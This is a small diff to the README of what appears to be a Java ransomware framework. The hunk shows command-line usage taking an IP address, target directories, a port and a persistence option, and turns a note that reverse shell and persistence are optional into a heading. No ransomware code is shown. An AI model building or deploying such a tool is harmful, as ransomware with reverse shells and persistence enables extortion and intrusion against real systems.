@@ -25,7 +25,7 @@ It is a project to build a ransomware made with java. With the framwork, ransomw
 * `java JRF 192.168.68.21 /home /home/user/Desktop`
 * `java JRF 192.168.68.21 /home 5678 /home/user/Desktop`
 * `java JRF 192.168.68.21 /home 5678 persistence /home/user/Desktop`
-Note: reverse shell and persistence are optional
+#### Note: reverse shell and persistence are optional
 
 
 ## Features:
